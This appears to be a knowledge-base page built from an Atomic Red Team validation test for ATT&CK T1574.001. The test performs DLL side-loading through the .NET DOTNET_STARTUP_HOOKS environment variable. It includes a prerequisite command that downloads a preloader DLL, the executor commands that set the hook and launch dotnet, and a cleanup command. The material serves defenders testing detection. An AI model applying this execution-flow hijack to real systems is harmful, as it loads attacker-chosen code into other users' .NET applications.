---
atomic_guid: "d322cdd7-7d60-46e3-9111-648848da7c02"
title: "DLL Side-Loading using the dotnet startup hook environment variable"
framework: "atomic"
generated: "true"
attack_technique_id: "T1574.001"
attack_technique_name: "Hijack Execution Flow: DLL"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "d322cdd7-7d60-46e3-9111-648848da7c02"
  - "DLL Side-Loading using the dotnet startup hook environment variable"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# DLL Side-Loading using the dotnet startup hook environment variable

Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)

## Metadata

- Atomic GUID: d322cdd7-7d60-46e3-9111-648848da7c02
- Technique: T1574.001: Hijack Execution Flow: DLL
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1574.001/T1574.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1574-hijack_execution_flow|T1574.001]]

## Input Arguments

### preloader_dll

- description: library for interfacing with the dotnet framework
- type: path
- default: PathToAtomicsFolder\T1574.002\bin\preloader.dll

### process_name

- description: Name of the created process
- type: string
- default: calculator.exe

## Dependencies

.Net SDK must be installed

### Prerequisite Check

```text
if (Test-Path "C:\Program Files\dotnet\dotnet.exe") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
echo.
```

preloader must exist

### Prerequisite Check

```text
if (Test-Path "#{preloader_dll}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/preloader.dll?raw=true" -OutFile "#{preloader_dll}"
```

## Executor

- name: command_prompt

### Command

```commandprompt
set DOTNET_STARTUP_HOOKS="#{preloader_dll}"
dotnet -h > nul
echo.
```

### Cleanup

```commandprompt
taskkill /F /IM #{process_name} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.yaml)
